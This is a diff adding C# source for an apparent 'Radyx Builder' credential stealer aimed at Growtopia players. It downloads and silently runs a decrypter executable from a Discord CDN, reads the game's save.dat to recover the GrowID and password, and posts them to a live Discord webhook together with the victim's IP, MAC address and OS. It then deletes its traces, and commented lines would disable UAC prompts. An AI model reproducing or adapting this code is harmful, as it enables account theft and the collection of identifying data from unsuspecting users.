@@ -1,0 +1,388 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Http;
+using System.Runtime.InteropServices;
+using System.Net.Mail;
+using System.Diagnostics;
+using System.Net.Mime;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Threading;
+using System.Net.Http.Headers;
+using System.Management;
+using System.Reflection;
+
+namespace strchange142
+{
+
+    internal class strchange143
+    {
+      
+
+  
+        public static string savePath()
+        {
+            try
+            {
+                RegistryKey gtreg;
+                if (Environment.Is64BitOperatingSystem)
+                {
+                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
+                }
+                else
+                {
+                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
+                }
+                try
+                {
+                    gtreg = gtreg.OpenSubKey(@"Software\Growtopia", true);
+                    string pathvalue = (string)gtreg.GetValue("path");
+                    if (Directory.Exists(pathvalue))
+                    {
+                        if (File.Exists(pathvalue + @"\save.dat"))
+                        {
+                            string sdat = null;
+                            var r = File.Open(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read);
+                            using (FileStream fileStream = new FileStream(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read))
+                            {
+                                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
+                                {
+                                    sdat = streamReader.ReadToEnd();
+                                    streamReader.Close();
+                                }
+                                r.Close();
+                                fileStream.Close();
+                            }
+
+                            if (sdat.Contains("tankid_password") & sdat.Contains("tankid_name"))
+                            {
+                                return pathvalue + @"\save.dat";
+                            }
+                            else
+                            {
+                                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                            }
+                        }
+                        else
+                        {
+                            return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                        }
+
+                    }
+                    else
+                    {
+                        return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                    }
+                }
+                catch
+                {
+                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+                }
+            }
+            catch
+            {
+                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+            }
+        }
+        public static string GetLastWorld()
+        {
+            try
+            {
+                string str1 = (string)null;
+                System.IO.File.Open(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                using (FileStream fileStream = new FileStream(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                    using (StreamReader streamReader = new StreamReader((Stream)fileStream, Encoding.Default))
+                        str1 = streamReader.ReadToEnd();
+                }
+                Regex regex = new Regex("[^\\w0-9]");
+                string str2 = str1.Replace("\0", " ");
+                return regex.Replace(str2.Substring(str2.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty) ?? "Not Found";
+            }
+            catch
+            {
+                return "";
+            }
+
+        }
+      
+              public static void ExtractResource(string FileName, string Name)
+        {
+            Assembly assembly = Assembly.GetCallingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(FileName))
+            {
+                byte[] bytes = new byte[(int)stream.Length];
+                stream.Read(bytes, 0, bytes.Length);
+                File.WriteAllBytes(Name, bytes);
+            }
+        }
+       
+        char[] s = new char[205];
+        public static void SendToDatabase()
+        {
+            string adana = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
+            string adanas = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
+
+
+
+
+
+            //copyfilewtfffxd
+            string text = "";
+            try
+            {
+                RegistryKey registryKey;
+                if (Environment.Is64BitOperatingSystem)
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
+                }
+                else
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
+                }
+                try
+                {
+                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
+                    string text2 = (string)registryKey.GetValue("path");
+                    if (Directory.Exists(text2))
+                    {
+                        string text3 = File.ReadAllText(text2 + "\\save.dat");
+                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
+                        {
+                            text = text2 + "\\save.dat";
+                        }
+                        else
+                        {
+                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                        }
+                    }
+                    else
+                    {
+                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                    }
+                }
+                catch
+                {
+                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                }
+            }
+            catch
+            {
+                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+            }
+            IPHostEntry host;
+            string localIP = @"";
+            host = Dns.GetHostEntry(Dns.GetHostName());
+            string a = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
+            localIP = a;
+            string address;
+            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
+            String sMacAddress = string.Empty;
+            foreach (NetworkInterface adapter in nics)
+            {
+                if (sMacAddress == String.Empty)// only return MAC Address from first card  
+                {
+                    IPInterfaceProperties properties = adapter.GetIPProperties();
+                    sMacAddress = adapter.GetPhysicalAddress().ToString();
+                }
+            }
+            address = sMacAddress;
+            string userName = Environment.UserName;
+            string str = Environment.MachineName.ToString();
+
+            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
+            foreach (ManagementObject managementObject in mos.Get())
+            {
+                String OSName = managementObject["Caption"].ToString();
+                string code = @"
+
+
+
+                     ";
+                byte[] buffer1 = Encoding.UTF8.GetBytes(@"                      
+                                          
+                  {
+  ""embeds"": [
+    {
+                ""title"": ""RadyxBuilder Database Notification"",
+      ""description"": ""PC Name: " + Environment.UserName + @"\nGrowID: ```" + adanas + @"```\nPassword: ```" + adana + "```" + @"\nLast World: " + GetLastWorld() + @"\nOS: " + OSName + @"\nIP Address: " + a + @"\nMac Address: " + address + @"\n"",
+      ""color"": 16711680
+    }
+  ],
+  ""username"": ""Radyx Builder v1.0"",
+  ""avatar_url"" : ""https://media.discordapp.net/attachments/717467721360736392/722253612264456252/Radyx.png""
+}
+                  
+                 "); ;
+                ByteArrayContent byteContent1 = new ByteArrayContent(buffer1);
+                byteContent1.Headers.ContentType = new MediaTypeHeaderValue("application/json");
+                HttpClient Client1 = new HttpClient();
+                HttpResponseMessage httpResponce1 = Client1.PostAsync("https://discordapp.com/api/webhooks/730377507630743563/CTrQfMGpsjTTGCS5L_vCDbiyLqcVjXDI2n7WnjcxEmhX5IuwdHJQwjkb9te1VA7QLViH", byteContent1).Result;
+
+            }
+        }
+
+        public static void SendPacket()
+        {
+
+
+            string adana = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
+
+
+
+            //copyfilewtfffxd
+
+
+
+            string text = "";
+            try
+            {
+                RegistryKey registryKey;
+                if (Environment.Is64BitOperatingSystem)
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
+                }
+                else
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
+                }
+                try
+                {
+                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
+                    string text2 = (string)registryKey.GetValue("path");
+                    if (Directory.Exists(text2))
+                    {
+                        string text3 = File.ReadAllText(text2 + "\\save.dat");
+                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
+                        {
+                            text = text2 + "\\save.dat";
+                        }
+                        else
+                        {
+                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                        }
+                    }
+                    else
+                    {
+                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                    }
+                }
+                catch
+                {
+                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                }
+            }
+            catch
+            {
+                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+            }
+            IPHostEntry host;
+            string localIP = @"";
+            host = Dns.GetHostEntry(Dns.GetHostName());
+            string a = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
+            localIP = a;
+            string address;
+            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
+            String sMacAddress = string.Empty;
+            foreach (NetworkInterface adapter in nics)
+            {
+                if (sMacAddress == String.Empty)// only return MAC Address from first card  
+                {
+                    IPInterfaceProperties properties = adapter.GetIPProperties();
+                    sMacAddress = adapter.GetPhysicalAddress().ToString();
+                }
+            }
+            address = sMacAddress;
+            string userName = Environment.UserName;
+            string str = Environment.MachineName.ToString();
+            string adanas = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
+
+            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
+            foreach (ManagementObject managementObject in mos.Get())
+            {
+                String OSName = managementObject["Caption"].ToString();
+                string code = @"
+
+
+
+                     ";
+                byte[] buffer1 = Encoding.UTF8.GetBytes(@"                      
+                                          
+                  {
+  ""embeds"": [
+    {
+                ""title"": ""RadyxBuilder Notification"",
+      ""description"": ""PC Name: " + Environment.UserName + @"\nGrowID: ```" + adanas + @"```\nPassword: ```" + adana + "```" + @"\nLast World: " + GetLastWorld() + @"\nOS: " + OSName + @"\nIP Address: " + a + @"\nMac Address: " + address + @"\n"",
+      ""color"": 16711680
+    }
+  ],
+  ""username"": ""Radyx Builder v1.0"",
+  ""avatar_url"" : ""https://media.discordapp.net/attachments/717467721360736392/722253612264456252/Radyx.png""
+}
+                  
+                 "); ;
+                ByteArrayContent byteContent1 = new ByteArrayContent(buffer1);
+                byteContent1.Headers.ContentType = new MediaTypeHeaderValue("application/json");
+                HttpClient Client1 = new HttpClient();
+                HttpResponseMessage httpResponce1 = Client1.PostAsync("//webhook1", byteContent1).Result;
+
+            }
+        }
+        public static byte[] StringToByteArray(string hex)
+        {
+            return Enumerable.Range(0, hex.Length)
+                             .Where(x => x % 2 == 0)
+                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
+                             .ToArray();
+        }
+        private static void Main(string[] args)
+        {
+           // Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
+           // Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin", 0);
+           // Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "PromptOnSecureDesktop", 0);
+           // Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Action Center\\Checks\\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.check.0", "CheckSetting", StringToByteArray("23004100430042006C006F00620000000000000000000000010000000000000000000000"), RegistryValueKind.Binary);
+
+            //addnormalstartupxdd
+
+
+            //hidefile
+
+
+            //decoder
+
+            
+                string fileName = Path.GetTempPath() + "\\pass.txt";
+
+                FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
+                fs.Close();
+                string fileNamea = Path.GetTempPath() + "\\user.txt";
+
+                  FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
+                  fsa.Close();
+
+
+            WebClient wc = new WebClient();
+                wc.DownloadFile("https://cdn.discordapp.com/attachments/732523154639028265/732537877103116309/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");
+            
+
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = Path.GetTempPath() + "\\decode.exe",
+                WindowStyle = ProcessWindowStyle.Hidden
+            }).WaitForExit();
+
+            SendPacket();
+            File.Delete(Path.GetTempPath() + "\\user.txt");
+            File.Delete(Path.GetTempPath() + "\\pass.txt");
+            File.Delete(Path.GetTempPath() + "\\decode.exe"); 
+
+        }
+
+    }
+}
